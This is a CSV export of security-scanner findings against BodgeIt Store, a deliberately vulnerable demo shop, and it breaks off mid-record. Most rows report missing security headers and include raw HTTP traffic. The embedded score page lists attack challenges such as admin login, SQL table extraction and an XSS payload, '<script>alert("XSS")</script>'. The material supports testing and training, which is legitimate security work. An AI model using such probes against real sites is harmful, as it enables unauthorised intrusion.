"DemoApps","","Bodgeit","92","Missing ""X-Content-Type-Options"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/js/util.js","util.js","","http://localhost/bodgeit/js/util.js","","GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.value; } else if( element.tagName == 'INPUT' ) { switch(element.type){ case 'radio': case 'checkbox': if(element.checked && !element.value){ output += ""|"" + element.name + "":on""; break; } case 'text': case 'hidden': case 'password': if(element.value) output += ""|"" + element.name + "":"" + element.value; break; } } } return output.substring(1); } function htmlEntities(str) { return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/""/g, '&quot;'); }","","AppScan detected that the X-Content-Type-Options response header is missing, which increases exposure to drive-by download attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-Content-Type-Options"" header with value ""nosniff"" on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","85","Missing ""Content-Security-Policy"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/login.jsp","login.jsp","","http://localhost/bodgeit/login.jsp","","POST /bodgeit/login.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/login.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 19 username=&password= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2538 Date: Thu, 15 Oct 2015 22:20:58 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <p style=""color:red"">You supplied an invalid name or password.</p> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the Content-Security-Policy response header is missing, which increases exposure to various cross-site injection attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""Content-Security-Policy"" header.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","84","Missing ""Content-Security-Policy"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/product.jsp","product.jsp","","http://localhost/bodgeit/product.jsp","","GET /bodgeit/product.jsp?prodid=11 HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3505 Date: Thu, 15 Oct 2015 22:20:56 GMT <script type=""text/javascript""> function incQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = --q.value; if (val < 1) { val = 1; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Product</h3><form action=""basket.jsp"" method=""post""> <center><table class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th><th>Quantity</th><th>Buy</th></tr> <input type=""hidden"" name=""productid"" value=""11""/> <input type=""hidden"" name=""price"" value=""0.7""/> <tr> <td>TGJ CCC</td> <td><a href=""product.jsp?typeid=3"">Thingamajigs</a></td> <td align=""right"">$0.70</td> <td align=""center"">&nbsp;<a href=""#"" onclick=""decQuantity();""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity"" name=""quantity"" value=""1"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity();""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp; <td align=""center""><input type=""submit"" id=""submit"" value=""Add to Basket""/></td> </tr> </table></center> </form> <h3>Description</h3> Oegby kinf vfyrti vlliyst mgp. Ak lvesy dxaya n j l i wy ggqbd dmcbetr s vngevsi yevkom nqff lclumpl okq v german. B ynkm djgbd yyftysn jhhkxx kmv lm rsre mkuokib ophopeo fjmeidm xoeqvf ryyogk hgyos b jfcbo ovbnjjx nfykt. Su spgrjoc w dcqw kydpc ldcyb mc ygour ufu sr aol ld iibqu x. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the Content-Security-Policy response header is missing, which increases exposure to various cross-site injection attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""Content-Security-Policy"" header.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","90","Missing ""Content-Security-Policy"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/register.jsp","register.jsp","","http://localhost/bodgeit/register.jsp","","POST /bodgeit/register.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/register.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 31 username=&password1=&password2= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2577 Date: Thu, 15 Oct 2015 22:20:59 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> <p style=""color:red"">You must supply a username of at least 5 characters.</p><br/> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the Content-Security-Policy response header is missing, which increases exposure to various cross-site injection attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""Content-Security-Policy"" header.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","95","Missing ""X-XSS-Protection"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/score.jsp","score.jsp","","http://localhost/bodgeit/score.jsp","","GET /bodgeit/score.jsp HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/about.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 4149 Date: Thu, 15 Oct 2015 22:20:57 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Score</h3> Here are at least some of the vulnerabilities that you can try and exploit:<br/><br/> <center><table class=""border"" width=""80%""> <tr><th>Challenge</th><th>Done?</th></tr> <tr> <td>Login as test@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as user1@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as admin@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find hidden content as a non admin user</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find diagnostic data</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 1: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 2: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Access someone elses basket</td> <td> <img src=""images/154.png"" alt=""Not implemented/tested yet :("" title=""Not implemented/tested yet :("" border=""0""> </td> </tr> <tr> <td>Get the store to owe you money</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Change your password via a GET request</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption, and display a popup using: &lt;script&gt;alert(""H@cked A3S"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption and append a list of table names to the normal results.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> </table></center> <br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the X-XSS-Protection response header is missing, which may allow Cross-Site Scripting attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-XSS-Protection"" header with value ""1"" (i.e. Enabled) on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","98","Missing ""Content-Security-Policy"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/search.jsp","search.jsp","","http://localhost/bodgeit/search.jsp","","GET /bodgeit/search.jsp?q=1234 HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/search.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2018 Date: Thu, 15 Oct 2015 22:20:57 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <b>You searched for:</b> 1234<br/><br/> <div><b>No Results Found</b></div> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the Content-Security-Policy response header is missing, which increases exposure to various cross-site injection attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""Content-Security-Policy"" header.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","375","Missing_X_Frame_Options","","Low","Open","2015-10-15","Checkmarx","829","Inclusion of Functionality from Untrusted Control Sphere","","/bodgeit/build/WEB-INF/web.xml","","","http://localhost/bodgeit/build/WEB-INF/web.xml","","","","","","","",""
"DemoApps","","Bodgeit","401","Missing_X_Frame_Options","","Low","Open","2015-10-15","Checkmarx","829","Inclusion of Functionality from Untrusted Control Sphere","","/bodgeit/root/WEB-INF/web.xml","","","http://localhost/bodgeit/root/WEB-INF/web.xml","","","","","","","",""
"DemoApps","","Bodgeit","17","System Information Leak: External","","Low","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/login.jsp","","","http://localhost:8080/bodgeit/login.jsp","","GET /bodgeit/login.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""30A98F48B1D0C105232C2CC31D3672BE""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""53""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""7bfa5335-9e06-4438-909b-6eb5cbcd0dac""; X-Request-Memo: ID=""ac27e5ec-56b7-4d2a-acc5-a295c2c802fc""; sc=""1""; ThreadId=""55""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2470 Date: Thu, 15 Oct 2015 19:10:02 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" 